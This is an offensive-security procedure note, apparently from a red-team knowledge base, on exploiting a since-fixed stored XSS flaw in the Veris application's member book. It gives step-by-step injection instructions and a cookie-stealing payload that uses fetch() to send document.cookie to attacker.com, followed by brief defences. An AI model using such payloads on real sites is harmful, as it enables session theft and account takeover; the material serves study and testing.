---
id: proc-uuid-001
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.439Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-Member-Book

## Summary

This procedure demonstrates how to exploit a stored XSS vulnerability in the Veris application's member book feature by injecting malicious JavaScript through unsanitized inputs handled by the Datatables library, allowing the payload to persist and execute for subsequent users.

## Description

In the Veris application, the member book feature uses the Datatables JavaScript library to display user-submitted content without proper input sanitization or output encoding. An attacker with authenticated access can submit a payload in a field like a member description or note, which gets stored in the backend and rendered as HTML/JS when other users view the member book. This leads to arbitrary code execution in the viewer's browser context, enabling attacks like session theft or phishing. The vulnerability was reported on April 8, 2016, and resolved by May 2, 2016.

## Requirements

1. Authenticated access to the Veris web application
2. Knowledge of the member book input fields (e.g., via exploratory testing)
3. A controlled server to receive exfiltrated data (for advanced payloads)

## Defense

Defensive measures and detection strategies:

- Implement content security policy (CSP) to restrict script execution
- Sanitize all user inputs and encode outputs in Datatables rendering
- Monitor for anomalous JavaScript network requests from the application

## Objectives

1. Persist malicious JavaScript in the member book storage
2. Ensure the payload evades basic client-side validation
3. Prepare for execution in victim sessions to steal data like cookies

## Instructions

### Step 1: Authenticate and Navigate

**Context**: Gain access to the vulnerable feature to locate the injection point.

Log in to the Veris application using valid credentials and navigate to the member book section. Identify input fields processed by Datatables, such as adding or editing a member entry.

### Step 2: Craft and Submit Payload

**Context**: Create a payload that executes JavaScript upon rendering and submit it via the input form.

Use a simple test payload for proof-of-concept:

```html
<script>alert('Stored XSS Triggered');</script>
```

Or an exfiltration payload:

```html
<script>fetch('http://attacker.com/steal?data=' + encodeURIComponent(document.cookie));</script>
```

Submit the form. The payload is stored without sanitization due to flaws in the Datatables implementation.

**Expected Output**: Form submission succeeds, and the entry is saved. Verify by viewing the member book as the same user—no immediate execution if not re-rendered.

### Step 3: Validate Storage

**Context**: Confirm the payload persists by checking the stored content.

Refresh or re-access the member book. If self-view triggers it, adjust payload; otherwise, it awaits victim view.

**Expected Output**: Payload visible in raw form in the page source when inspected.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
